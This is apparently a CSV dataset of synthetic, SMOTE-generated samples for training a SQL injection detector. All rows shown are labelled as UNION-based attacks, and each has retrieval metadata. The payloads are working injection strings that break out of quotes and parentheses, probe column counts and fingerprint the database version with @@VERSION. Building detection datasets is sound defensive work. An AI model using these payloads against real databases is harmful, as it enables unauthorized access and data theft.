id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000125,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000169,0.011337307618940575
SMOTE_000126,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000066,0.13913716122650205
SMOTE_000127,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000071,0.10367265741777337
SMOTE_000128,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000015,0.011126435410267501
SMOTE_000129,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000666,0.7568956500984564
SMOTE_000130,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000428,0.4901686695002305
SMOTE_000131,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000287,0.08551748680190517
SMOTE_000132,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.0
SMOTE_000133,attack,union,"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",nearest_attack_euclidean,R000749,0.2049370205246139
SMOTE_000134,attack,union,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",nearest_attack_euclidean,R000293,0.15982465118958727
SMOTE_000135,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000161,0.10142533314298083
SMOTE_000136,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000467,0.11787146070835079
SMOTE_000137,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.9078849825360621
SMOTE_000138,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000310,0.3055444915340709
SMOTE_000139,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000687,0.1632724387342764
SMOTE_000140,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.1596159764481709
SMOTE_000141,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R000574,0.47990654410385275
SMOTE_000142,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000257,0.2655532017283523
SMOTE_000143,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000714,0.36223717496244867
SMOTE_000144,attack,union,"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",nearest_attack_euclidean,R000642,0.00012897985140800647
SMOTE_000145,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000591,0.08510540635903215
SMOTE_000146,attack,union,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",nearest_attack_euclidean,R000737,0.18986234595768894
SMOTE_000147,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000110,0.1472715657285423
SMOTE_000148,attack,union," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",nearest_attack_euclidean,R000091,0.2590892586028887
SMOTE_000149,attack,union,"-3666""   )    )     )   union all select 4136,4136,4136--",nearest_attack_euclidean,R000254,0.8155317959018951
SMOTE_000150,attack,union,"1"" where 4684  =  4684 union all select null,null,null,null#",nearest_attack_euclidean,R000503,0.33441040218589396
SMOTE_000151,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000463,0.030167956658665163
SMOTE_000152,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000067,0.016895908310355364
SMOTE_000153,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000525,0.5371200983252601
SMOTE_000154,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000252,0.9513662851649596
SMOTE_000155,attack,union,"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",nearest_attack_euclidean,R000642,0.33224414864117513
SMOTE_000156,attack,union,"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",nearest_attack_euclidean,R000529,0.11442380793119855
SMOTE_000157,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000528,0.3062619094480128
SMOTE_000158,attack,union,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",nearest_attack_euclidean,R000339,0.38673524206664384
SMOTE_000159,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000649,0.06556276879037365
SMOTE_000160,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R000160,0.0
SMOTE_000161,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000311,0.5464020886013359
SMOTE_000162,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R000574,0.276105747948864
SMOTE_000163,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.1300201953125561
SMOTE_000164,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000604,0.20528599741752532
SMOTE_000165,attack,union,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",nearest_attack_euclidean,R000194,0.4287619652680293
SMOTE_000166,attack,union,"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",nearest_attack_euclidean,R000678,0.5375631072943643
SMOTE_000167,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000257,0.0
SMOTE_000168,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000755,0.19902390992295235
SMOTE_000169,attack,union," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000059,0.014176057535324756
SMOTE_000170,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R000681,0.5254868536141221
SMOTE_000171,attack,union,"1'   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000726,0.24740883111271678
SMOTE_000172,attack,union,"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",nearest_attack_euclidean,R000683,0.681564528025534
SMOTE_000173,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R000537,0.23812592432629348
SMOTE_000174,attack,union,"-4236'  )   union all select 2076,2076,2076,2076,2076,2076,2076,2076,2076,2076#",nearest_attack_euclidean,R000768,0.0030328674016777543
SMOTE_000175,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000431,0.32308450475474837
SMOTE_000176,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R000657,0.629265642158608
SMOTE_000177,attack,union,"-4068'   )    )     )   union all select 9491,9491,9491--",nearest_attack_euclidean,R000401,0.1094156258622891
SMOTE_000178,attack,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.13823311423651943
SMOTE_000179,attack,union,"-2790'  )   as xhct where 5756  =  5756 union all select 5756,5756#",nearest_attack_euclidean,R000599,0.45036771858809255
SMOTE_000180,attack,union,1   )    )    as myxo where 1759  =  1759 union all select null#,nearest_attack_euclidean,R000731,0.035098493970170966
SMOTE_000181,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000313,0.031220699226809857
SMOTE_000182,attack,union,"-1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#",nearest_attack_euclidean,R000766,0.3257225916218803
SMOTE_000183,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000744,0.03652628940006126
SMOTE_000184,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R000296,0.27764805769641987
SMOTE_000185,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000559,1.040209046687093
SMOTE_000186,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000554,0.2495154768084046
SMOTE_000187,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000112,0.15658272140326351
SMOTE_000188,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000141,0.04441288342856605
SMOTE_000189,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000553,0.34627724301751994
SMOTE_000190,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000028,0.05935807194791859
SMOTE_000191,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000246,0.06778553339086414
SMOTE_000192,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000400,0.032317986705558
SMOTE_000193,attack,union,"-9896""   )    )     )   union all select 4073,4073,4073,4073,4073#",nearest_attack_euclidean,R000696,0.6859677824524676
SMOTE_000194,attack,union,"1%""   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000427,0.42465614460738443
SMOTE_000195,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000448,0.44002314033256806
